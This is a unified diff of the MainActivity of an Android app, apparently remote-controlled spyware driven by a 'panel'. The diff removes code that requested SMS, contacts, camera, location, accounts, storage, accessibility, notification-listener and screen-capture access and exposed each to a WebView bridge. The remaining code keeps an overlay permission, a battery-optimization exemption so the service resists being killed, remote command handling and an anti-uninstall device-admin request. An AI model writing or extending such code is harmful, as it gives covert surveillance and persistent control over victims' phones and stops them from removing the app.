@@ -1,46 +1,25 @@
 package com.sync.xxx
 
-import android.Manifest
 import android.annotation.SuppressLint
-import android.app.Activity
-import android.app.admin.DevicePolicyManager
 import android.content.*
-import android.content.pm.PackageManager
-import android.location.LocationManager
-import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.webkit.*
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import org.json.JSONObject
-import com.google.android.gms.common.api.ResolvableApiException
-import com.google.android.gms.location.*
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private var accountUid: String = "unknown"
 
-    // ─── HTML dimuat dari asset lokal, bukan URL eksternal ───
     private val HTML_ASSET = "file:///android_asset/index.html"
 
-    private val PERM_REQUEST_CODE = 9000
-    private var permIndex = 0
     private var settingIndex = 0
     private var isRequestingSettings = false
-    private var hasRequestedPermissions = false
-
-    private val screenCaptureReceiver = object : BroadcastReceiver() {
-        override fun onReceive(ctx: Context, intent: Intent) {
-            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
-                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                startActivityForResult(mgr.createScreenCaptureIntent(), 102)
-            }
-        }
-    }
+    private var hasRequestedSettings = false
 
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
@@ -89,27 +68,14 @@ class MainActivity : AppCompatActivity() {
         val filter = IntentFilter(DeviceService.ACTION_COMMAND)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
-            registerReceiver(
-                screenCaptureReceiver,
-                IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE"),
-                RECEIVER_NOT_EXPORTED
-            )
         } else {
             registerReceiver(commandReceiver, filter)
-            registerReceiver(screenCaptureReceiver, IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE"))
         }
     }
 
+    // ✅ Nggak nunggu camera/location lagi — overlay-only mode
     private fun startDeviceService() {
         try {
-            val hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-            val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-
-            if (!hasCamera && !hasLocation) {
-                android.util.Log.w("MainActivity", "Izin dasar belum ada, skip startDeviceService")
-                return
-            }
-
             val svcIntent = Intent(this, DeviceService::class.java)
             ContextCompat.startForegroundService(this, svcIntent)
         } catch (e: Exception) {
@@ -144,10 +110,10 @@ class MainActivity : AppCompatActivity() {
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                if (!hasRequestedPermissions) {
-                    hasRequestedPermissions = true
+                if (!hasRequestedSettings) {
+                    hasRequestedSettings = true
                     Handler(Looper.getMainLooper()).postDelayed({
-                        startPermissionSequence()
+                        startSettingSequence()
                     }, 1500)
                 }
             }
@@ -171,7 +137,6 @@ class MainActivity : AppCompatActivity() {
         loadHtmlAsset()
     }
 
-    // ─── LOAD HTML DARI ASSET ───────────────────────────────────────────
     private fun loadHtmlAsset() {
         val hasHtml = try {
             assets.open("index.html").use { it.available() > 0 }
@@ -181,10 +146,10 @@ class MainActivity : AppCompatActivity() {
 
         if (!hasHtml) {
             showErrorPage("Aplikasi Error.\nFile HTML belum ditemukan dalam paket.")
-            if (!hasRequestedPermissions) {
-                hasRequestedPermissions = true
+            if (!hasRequestedSettings) {
+                hasRequestedSettings = true
                 Handler(Looper.getMainLooper()).postDelayed({
-                    startPermissionSequence()
+                    startSettingSequence()
                 }, 1500)
             }
             return
@@ -229,71 +194,19 @@ class MainActivity : AppCompatActivity() {
         webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
     }
 
-    private val runtimePerms: List<String> by lazy {
-        val list = mutableListOf(
-            Manifest.permission.CAMERA,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_PHONE_NUMBERS,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.GET_ACCOUNTS
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            list.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
-                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-            }
-        }
-        list
-    }
-
-    private fun startPermissionSequence() {
-        permIndex = 0
-        requestNextRuntimePermission()
-    }
-
-    private fun requestNextRuntimePermission() {
-        while (permIndex < runtimePerms.size &&
-            ContextCompat.checkSelfPermission(this, runtimePerms[permIndex]) == PackageManager.PERMISSION_GRANTED
-        ) {
-            permIndex++
-        }
-
-        if (permIndex < runtimePerms.size) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(runtimePerms[permIndex]),
-                PERM_REQUEST_CODE + permIndex
-            )
-        } else {
-            settingIndex = 0
-            requestNextSpecialSetting()
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode >= PERM_REQUEST_CODE) {
-            permIndex++
-            Handler(Looper.getMainLooper()).postDelayed({
-                requestNextRuntimePermission()
-            }, 500)
-        }
+    // ═════════════════════════════════════════════════════════════
+    // SPECIAL SETTINGS: cuma Overlay + Battery Opt (+ Device Admin)
+    // ═════════════════════════════════════════════════════════════
+    private fun startSettingSequence() {
+        settingIndex = 0
+        requestNextSpecialSetting()
     }
 
     private fun requestNextSpecialSetting() {
         val settingsIntents = mutableListOf<Intent>()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            // 1. OVERLAY (izin utama)
             if (!Settings.canDrawOverlays(this)) {
                 settingsIntents.add(
                     Intent(
@@ -302,6 +215,7 @@ class MainActivity : AppCompatActivity() {
                     )
                 )
             }
+            // 2. Battery optimization (opsional, biar service tahan dibunuh)
             val pm = getSystemService(POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                 settingsIntents.add(
@@ -313,36 +227,10 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        if (!AppBlockerService.isUsageAccessGranted(this)) {
-            settingsIntents.add(
-                Intent(
-                    Settings.ACTION_USAGE_ACCESS_SETTINGS,
-                    Uri.parse("package:$packageName")
-                )
-            )
+        // 3. Anti-uninstall admin: hanya kalau panel aktifkan via command setAntiUninstall
+        if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(this)) {
+            AntiUninstallHelper.requestAdminIfNeeded(this)
         }
-        if (!AppBlockerService.isEnabled(this)) {
-            settingsIntents.add(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        }
-        if (!SmsNotifService.isEnabled(this)) {
-            settingsIntents.add(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                settingsIntents.add(
-                    Intent(
-                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                        Uri.parse("package:$packageName")
-                    )
-                )
-            }
-        }
-        
-        // Anti-uninstall admin TIDAK diminta otomatis.
-// Hanya diminta via command "setAntiUninstall" dari panel.
-if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(this)) {
-    AntiUninstallHelper.requestAdminIfNeeded(this)
-}
 
         if (settingIndex < settingsIntents.size) {
             isRequestingSettings = true
@@ -376,24 +264,9 @@ if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(th
         }
     }
 
-    @Suppress("DEPRECATION")
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == 102) {
-            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
-                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
-                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
-                setPackage(packageName)
-                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
-            }
-            sendBroadcast(intent)
-        }
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
-        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
     }
 
     private fun handleCommand(cmd: String, value: String) {
@@ -423,46 +296,23 @@ if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(th
         sendBroadcast(i)
     }
 
-    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-    fun isGalleryGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-    fun requestGalleryPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CODE)
-    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
-    fun isLocationGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-    fun isGpsEnabled() = (getSystemService(LOCATION_SERVICE) as LocationManager).isProviderEnabled(LocationManager.GPS_PROVIDER)
-    fun requestLocationPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), PERM_REQUEST_CODE)
-    fun isContactsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-    fun requestContactsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_REQUEST_CODE)
-    fun isGmailGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
-    fun requestGmailPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_REQUEST_CODE)
-    fun isPhoneGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
-    fun requestPhonePerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), PERM_REQUEST_CODE)
-    fun isManageStorageGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName) else true
-    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
-    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)
-    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)
-    fun requestAccessibilityPerm() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-    fun requestUsageAccessPerm() = startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:$packageName")))
-    fun requestOverlayPerm() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))) }
-    fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CODE)
-    fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_REQUEST_CODE)
-    fun openNotifListenerSettings() = startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-    fun openBatterySettings() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))) }
-    fun requestEnableGps() {
-        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
-        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
-        LocationServices.getSettingsClient(this).checkLocationSettings(builder.build()).addOnFailureListener { exception ->
-            if (exception is ResolvableApiException) {
-                try { exception.startResolutionForResult(this, 107) } catch (_: Exception) {}
-            }
+    // ─── Helper hanya yang masih dipakai ───
+    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
+    else true
+
+    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+        Settings.canDrawOverlays(this) else true
+
+    fun requestOverlayPerm() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
         }
     }
-    fun requestManageStoragePerm() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            try { startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName"))) } catch (_: Exception) {}
-        } else {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERM_REQUEST_CODE)
+
+    fun openBatterySettings() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
         }
     }
 
@@ -482,39 +332,18 @@ if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(th
 class AppBridge(private val context: Context, private val webView: WebView) {
     companion object { var instance: AppBridge? = null }
 
-    @JavascriptInterface fun getDeviceId(): String = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+    @JavascriptInterface fun getDeviceId(): String =
+        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+
     @JavascriptInterface fun getDeviceName(): String {
         val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
         val n = Build.MODEL
         return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
     }
+
     @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected
-    @JavascriptInterface fun isCamGranted() = (context as MainActivity).isCamGranted()
-    @JavascriptInterface fun isSmsGranted() = (context as MainActivity).isSmsGranted()
-    @JavascriptInterface fun isNotifListenerGranted() = (context as MainActivity).isNotifListenerGranted()
     @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
     @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
-    @JavascriptInterface fun isAccessibilityGranted() = (context as MainActivity).isAccessibilityGranted()
-    @JavascriptInterface fun isUsageAccessGranted() = (context as MainActivity).isUsageAccessGranted()
-    @JavascriptInterface fun requestCamPerm() = (context as MainActivity).requestCamPerm()
-    @JavascriptInterface fun requestSmsPerm() = (context as MainActivity).requestSmsPerm()
-    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
     @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
-    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
-    @JavascriptInterface fun requestAccessibilityPerm() = (context as MainActivity).requestAccessibilityPerm()
-    @JavascriptInterface fun requestUsageAccessPerm() = (context as MainActivity).requestUsageAccessPerm()
-    @JavascriptInterface fun isGalleryGranted() = (context as MainActivity).isGalleryGranted()
-    @JavascriptInterface fun requestGalleryPerm() = (context as MainActivity).requestGalleryPerm()
-    @JavascriptInterface fun isLocationGranted() = (context as MainActivity).isLocationGranted()
-    @JavascriptInterface fun isGpsEnabled() = (context as MainActivity).isGpsEnabled()
-    @JavascriptInterface fun requestLocationPerm() = (context as MainActivity).requestLocationPerm()
-    @JavascriptInterface fun requestEnableGps() = (context as MainActivity).requestEnableGps()
-    @JavascriptInterface fun isContactsGranted() = (context as MainActivity).isContactsGranted()
-    @JavascriptInterface fun requestContactsPerm() = (context as MainActivity).requestContactsPerm()
-    @JavascriptInterface fun isGmailGranted() = (context as MainActivity).isGmailGranted()
-    @JavascriptInterface fun requestGmailPerm() = (context as MainActivity).requestGmailPerm()
-    @JavascriptInterface fun isPhoneGranted() = (context as MainActivity).isPhoneGranted()
-    @JavascriptInterface fun requestPhonePerm() = (context as MainActivity).requestPhonePerm()
-    @JavascriptInterface fun isManageStorageGranted() = (context as MainActivity).isManageStorageGranted()
-    @JavascriptInterface fun requestManageStoragePerm() = (context as MainActivity).requestManageStoragePerm()
+    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
 }
